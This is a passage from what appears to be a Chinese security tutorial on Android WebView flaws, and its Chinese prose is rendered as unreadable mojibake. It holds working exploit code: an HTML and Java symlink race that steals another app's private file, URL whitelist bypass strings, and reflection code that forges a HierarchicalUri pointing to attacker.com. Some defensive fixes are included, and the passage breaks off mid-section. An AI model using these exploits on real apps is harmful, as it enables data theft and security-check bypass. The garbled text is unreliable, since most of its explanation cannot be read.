<p>æ”»å‡»è¿‡ç¨‹ï¼šé¦–å…ˆæ˜¯æ“æ§webviewå»è®¿é—®æ”»å‡»appè‡ªå·±å…¬å¼€çš„ä¸€ä¸ªç½‘é¡µï¼Œç„¶åè¿™ä¸ªç½‘é¡µæ‰§è¡Œçš„å†…å®¹å…¶å®æ˜¯å»¶æ—¶å»è¯»å–è‡ªèº«ï¼Œåœ¨å»¶æ—¶è¯»å–è‡ªèº«çš„æ—¶é—´çª—å£å†…ï¼Œè¿™ä¸ªæ–‡ä»¶æ‚„æ‚„è¢«è¿›è¡Œäº†æ›¿æ¢ï¼Œæ›¿æ¢æˆäº†è½¯è¿æ¥ï¼ŒæŒ‡å‘å—å®³è€…appçš„ä¸€ä¸ªç§æœ‰æ–‡ä»¶ï¼Œæœ€ç»ˆè¯»å–çªƒå–å†…å®¹</p>
<p>æ„é€ HTMLæ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#æ¶æ„APPçš„HTML,è¢«æ£€æµ‹APPåŠ è½½æ­¤htmlï¼Œæ‰§è¡ŒJSä»£ç </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var d = document;</span><br><span class="line">function loadDatabase()</span><br><span class="line">&#123;</span><br><span class="line">    var file_url = d.URL;</span><br><span class="line">    var xmlhttp =new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onload=function() &#123;    //å›è°ƒå‡½æ•° å½“è¯·æ±‚å®Œæˆæ—¶æ‰§è¡Œ</span><br><span class="line">         document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span><br><span class="line">        alert(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,file_url);</span><br><span class="line">    xmlhttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(loadDatabase(),8000); #å»¶è¿Ÿ8ç§’æ‰§è¡Œã€‚åˆ©ç”¨æ—¶é—´å·®å’Œè½¯é“¾æ¥æ¥è·å–è¢«æ”»å‡»APPçš„ç§æœ‰æ–‡ä»¶</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ„é€ æ¶æ„appçš„æ”»å‡»ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#æ¶æ„APPçš„æ”»å‡»ä»£ç </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;æ¶æ„APPçš„HTML,åœ¨ä¸Šé¢çš„HTMLä»£ç &quot;</span>;</span><br><span class="line">          #æ–°å»ºæ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾æ¶æ„HTMLæ–‡ä»¶</span><br><span class="line">           cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">           #å°†æ¶æ„HTMLåˆ°æ¶æ„APPçš„æ²™ç›’ç›®å½•</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #æˆæƒç›®å½•åŠå…¶æ–‡ä»¶æƒé™ï¼Œå…è®¸å…¶å®ƒåº”ç”¨è®¿é—®</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #å¯åŠ¨è¢«æ”»å‡»çš„APPï¼Œå¹¶æºå¸¦æ¶æ„HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #å»¶æ—¶<span class="number">6</span>ç§’</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #åˆ é™¤HTMLæ–‡ä»¶</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #è½¯é“¾æ¥æ–‡ä»¶ï¼Œå®ç°è¯»å–è¢«æ”»å‡»åº”ç”¨çš„<span class="keyword">private</span>.txtæ–‡ä»¶</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>ç›®æ ‡æ ·æœ¬ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#è¢«æ”»å‡»çš„APPï¼Œæœ‰æ¼æ´çš„ä»£ç </span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  å…è®¸åŠ è½½FileåŸŸ</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #å–å‡ºäº†æ¶æ„HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #åŠ è½½äº†æ¶æ„HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="å®‰å…¨é˜²æŠ¤-3">å®‰å…¨é˜²æŠ¤</h6>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ã€è®¾ç½®<span class="keyword">set</span>AllowFileAccessæ–¹æ³•ä¸º<span class="literal">false</span>,è®¾ç½®<span class="keyword">set</span>AllowFileAccessFromFileURLså’Œ </span><br><span class="line">    <span class="keyword">set</span>AllowUniversalAccessFromFileURLsä¸º<span class="literal">false</span>ã€‚</span><br><span class="line">2ã€åœ¨Android4.0<span class="params">(API15)</span>åŠä»¥ä¸‹å¾—é‡‡ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œæ‰‹åŠ¨æ ¡éªŒæ˜¯å¦è®¿é—®fileåŸŸ</span><br><span class="line">3ã€å½“WebViewæ‰€åœ¨Activityå­˜åœ¨ç»„ä»¶æš´éœ²æ—¶ï¼Œè‹¥ä¸æ˜¯å¿…è¦çš„ç»„ä»¶æš´éœ²ï¼Œåº”è¯¥ç¦æ­¢ç»„ä»¶æš´éœ²</span><br></pre></td></tr></table></figure>
<h5 id="æ±¡æŸ“cookie">æ±¡æŸ“cookie</h5>
<p><a target="_blank" rel="noopener" href="http://www.ctfiot.com/39656.html">Android-Webviewä¸­çš„æ¼æ´åˆ©ç”¨æ€»ç»“</a></p>
<h4 id="URLé…ç½®æ¼æ´">URLé…ç½®æ¼æ´</h4>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/201407.html">ä¸€æ–‡å½»åº•ææ‡‚å®‰å“WebViewç™½åå•æ ¡éªŒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p>è®¸å¤šURLå¯ä»¥é€šè¿‡å„ç§æ–¹å¼å»ç»•è¿‡éªŒè¯ï¼Œä»è€Œå¼•èµ·å„å¼å„æ ·çš„æ¼æ´getUserInfo</p>
<p>URLçš„æ„é€ ï¼š</p>
<p><code>scheme://login:password@address:port/path/to/resource/?query_string#fragment</code></p>
<ul>
<li>scheme<br>
ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒ…æ‹¬httpã€httpsã€fileã€ftpç­‰ç­‰,:ä¹‹åçš„â€œ//â€å¯çœç•¥ï¼Œä¾‹å¦‚http:www.qq.com, æ­¤å¤–ï¼Œå¤šæ•°æµè§ˆå™¨åœ¨schemeä¹‹å‰<strong>åŠ ç©ºæ ¼</strong>ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸è§£æçš„</li>
<li>login:password@ï¼ˆè®¤è¯ä¿¡æ¯ï¼‰<br>
æœåŠ¡å™¨æœ‰æ—¶å€™éœ€è¦ç”¨æˆ·åå’Œå¯†ç è®¤è¯ï¼Œftpåè®®æ¯”è¾ƒå¸¸è§ï¼Œhttpå¾ˆå°‘è§ï¼Œä½†è¿™ä¸ª<strong>ä¸å¸¸è§å­—æ®µå¾€å¾€å¯ä»¥ç»•è¿‡</strong>å¾ˆå¤šæ£€æŸ¥</li>
<li>address<br>
addresså­—æ®µå¯ä»¥æ˜¯ä¸€ä¸ª<strong>ä¸åŒºåˆ†å¤§å°å†™</strong>çš„åŸŸåã€ä¸€ä¸ªipv4åœ°å€æˆ–å¸¦æ–¹æ‹¬å·çš„ipv6åœ°å€ï¼Œéƒ¨åˆ†æµè§ˆå™¨æ¥æ”¶ipåœ°å€çš„å…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ç­‰å†™æ³•</li>
<li>port<br>
ç«¯å£å·</li>
<li>/path/to/resource<br>
å±‚çº§è·¯å¾„ï¼Œå¯ä»¥ä½¿ç”¨â€œâ€¦/â€åˆ°ä¸Šä¸€çº§ç›®å½•</li>
<li>query_string<br>
æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæ ¼å¼ä¸ºâ€query_string?name1=value1&amp;name2=value2â€</li>
<li>fragment<br>
ç”¨äºhtmlä¸­çš„é¡µé¢å®šä½</li>
</ul>
<h5 id="URLç»•è¿‡æ¼æ´">URLç»•è¿‡æ¼æ´</h5>
<p><a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URLæ£€æŸ¥ç»•è¿‡ | m4bln (mabin004.github.io)</a></p>
<p>çœ‹ä¸€ä¸ªç®€å•çš„urlæ ¡éªŒä¾‹å­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">    enableJavaScriptInterface();</span><br><span class="line">    <span class="comment">//æˆ–è€…webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä½¿ç”¨checkDomainå¯¹åŸŸåè¿›è¡Œæ ¡éªŒ</p>
<p>å®é™…ä¸­ä¼šå‘ç°è¿™æ ·çš„ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯ä¸ºäº†é˜²æ­¢åŠ è½½fileçš„åŒæºç­–ç•¥è¿›è¡Œçš„é˜²æŠ¤ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰å¾ˆå¤šç»•è¿‡çš„æ–¹æ³•</p>
<p><strong>æ€»ç»“</strong></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.å¤§å†™å­—æ¯ <span class="keyword">File</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">2</span>.å‰é¢åŠ ä¸Šç©ºæ ¼ï¼š <span class="keyword">file</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">3</span>.å­—ç¬¦ç¼–ç ï¼šâ€œ<span class="keyword">file</span>ï¼š%<span class="number">2</span>F/â€</span><br><span class="line"><span class="number">4</span>.å¯æ­£å¸¸è®¿é—®çš„ç•¸å½¢è·¯å¾„ï¼š<span class="keyword">file</span>:sdcard<span class="regexp">/attack/</span>htmlâ€ æˆ– â€œ<span class="keyword">file</span>:<span class="regexp">/\//</span>sdcard/attack.html</span><br></pre></td></tr></table></figure>
<p><strong>å¸¸è§çš„urlæ£€éªŒ</strong></p>
<p>urlä¸­ä¼šå¯¹é¦–å°¾è¿›è¡Œæ ¡éªŒ</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span>(host.endsWith(&quot;mysite.com&quot;))&#123;</span><br><span class="line">    <span class="built_in">enableJavascriptInterface</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å­˜åœ¨é—®é¢˜ï¼šendsWithæœªé—­åˆç‚¹å·</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç»•è¿‡ï¼ševilmysite<span class="selector-class">.com</span>  <span class="comment">//æ¶æ„åŸŸå</span></span><br><span class="line">ä¿®å¤ï¼š<span class="built_in">endsWith</span>(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨startsWithï¼Œcontainsï¼ŒindexOfï¼Œæ­£åˆ™åŒ¹é…ç­‰éä¸¥æ ¼å­—ç¬¦ä¸²åŒ¹é…</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">    enableJavascriptInterface();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ç»•è¿‡ï¼šmysite.com<span class="meta">@oppo</span>.com</span><br></pre></td></tr></table></figure>
<p>contains +indexOfç»•è¿‡ï¼š</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä»»ä½•å¯ä»¥æ·»åŠ å­—ç¬¦ä¸²çš„å­—æ®µ</span><br><span class="line">å­åŸŸå huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">å­è·¯å¾„ mysite.<span class="keyword">com</span>/huawei.<span class="keyword">com</span></span><br><span class="line">å‚æ•° mysite.<span class="keyword">com</span>/xxxx#huawei.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>
<p><strong>//å’Œç¬¬ä¸€ä¸ª/ä¹‹é—´æå–host</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//æå–host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»•è¿‡æ–¹å¼ï¼š</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å­åŸŸå huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">http://huawei.com@www.rebeyond.net/poc.htm</span><br><span class="line">http://<span class="variable">a:a</span>@www.huawei.<span class="keyword">com</span>:b@www.baidu.<span class="keyword">com</span> åœ¨androidä¸­ä½¿ç”¨getHostè·å–åˆ°çš„æ˜¯huawei.<span class="keyword">com</span>,ä½†å®é™…è®¿é—®çš„æ˜¯baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.VIEW</span> -d URIçš„å€¼  å¯åŠ¨è¿™ä¸ªurl</span><br></pre></td></tr></table></figure>
<h5 id="hearachical-Uriç»•è¿‡">hearachical Uriç»•è¿‡</h5>
<p>å‡è®¾æˆ‘ä»¬åŠ è½½çš„uriä¸æ˜¯é€šè¿‡Uri.parseï¼Œè€Œæ˜¯é€šè¿‡å¤–éƒ¨ç›´æ¥è·å–ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ hearachical æ¥ç»•è¿‡</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ HierarchicalUri å’Œ Java Reflection API è¿›è¡Œæ”»å‡»ï¼ŒåŒæ ·æˆ‘ä»¬åˆ†æä¸€ä¸ªæ ·æœ¬çš„URLéªŒè¯</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">   webView.loadUrl(uri.toString(), getAuthHeaders()); <span class="comment">//getAuthHeaders()è¯·æ±‚å¤´ä¿¡æ¯</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>android.net.Uriåœ¨Androidè¢«å¹¿æ³›ä½¿ç”¨ï¼Œä½†å®é™…ä¸Šä»–æ˜¯ä¸€ä¸ªæŠ½è±¡ç±» android.net.Uri$HierarchicalUriæ˜¯å®ƒçš„å­ç±»ä¹‹ä¸€ã€‚Java åå°„ API ä½¿åˆ›å»ºèƒ½å¤Ÿç»•è¿‡æ­¤æ£€æŸ¥çš„ Uri æˆä¸ºå¯èƒ½ã€‚</p>
<p>é€šè¿‡åå°„ä¼ â¼Šâ¼€ä¸ªschemeã€authoritiyå’Œpathï¼Œæ„é€ â¼€ä¸ªå½¢å¼ä¸º<code>https://legitimate.com@attacker.com</code>çš„HierachicalUriå®ä¾‹å³å¯ç»•è¿‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//javaåå°„è·å–ç±»å¼•ç”¨</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//æ„é€ HierachicalUriå®ä¾‹</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ–‡ä»¶<code>TestActivity.java</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"> </span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><strong>æ¼æ´é˜²æŠ¤ï¼š</strong></p>
<p>æˆ‘ä»¬åªéœ€è¦è®©æ”»å‡»çš„åº”ç”¨ç¨‹åºè·å–<code>Uri</code>æ”»å‡»è€…æ§åˆ¶çš„å¯¹è±¡å¹¶ä¸“é—¨ä½¿ç”¨è¯¥å¯¹è±¡</p>
<p>Uri uri = Uri.parse(intent.getData().toString());</p>
<p>ä» API çº§åˆ« 28 (Android 9) å¼€å§‹ï¼Œ<a target="_blank" rel="noopener" href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">ç¦æ­¢</a>ä½¿ç”¨å†…éƒ¨æ¥å£â€”â€”ä½†è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>ç­‰å·¥å…·è½»æ¾ç»•è¿‡</p>
<h5 id="URL-Schemeç»•è¿‡">URL Schemeç»•è¿‡</h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>ä»£ç åœ¨è¿›è¡Œurlæ ¡éªŒæ—¶ï¼Œæ£€æŸ¥äº†hostï¼Œä½†æ˜¯æœªæ£€æŸ¥Schemeï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€œjavascriptâ€ç»•è¿‡ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
